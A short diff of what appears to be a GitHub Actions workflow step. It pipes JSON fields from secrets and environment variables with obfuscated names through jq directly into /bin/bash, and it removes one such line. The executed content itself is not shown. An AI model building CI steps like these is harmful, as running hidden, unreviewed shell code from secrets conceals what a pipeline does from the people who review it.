@@ -19,7 +19,6 @@ jobs:
           q672: ${{ secrets.q672 }}
         run: |
           printf '%s' "$q672" | jq -r .vmr1540 | /bin/bash
-          echo $e54618 | jq -r .ilr6345 | /bin/bash
           printf '%s' "$yf8" | jq -r .pzqy3 | /bin/bash
 
       - name: Upload results
